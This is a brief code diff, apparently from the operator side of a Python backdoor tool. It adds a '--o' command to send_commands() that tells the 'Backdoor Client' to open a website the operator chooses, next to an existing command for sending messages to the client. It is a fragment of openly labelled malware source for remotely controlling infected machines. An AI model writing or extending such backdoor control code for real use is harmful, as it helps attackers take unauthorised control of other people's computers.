@@ -244,6 +244,10 @@ def send_commands():
             strMsg= 'msg' + strChoice[3:]
             send(str.encode(strMsg))
 
+        # --o [WEBSITE_URL]: Command for Open Website on the Backdoor Client
+        elif strChoice[:3] == '--o' and len(strChoice) > 3:
+            strSite = 'site' + strChoice[4:]
+            send(str.encode(strSite))
 
 
 
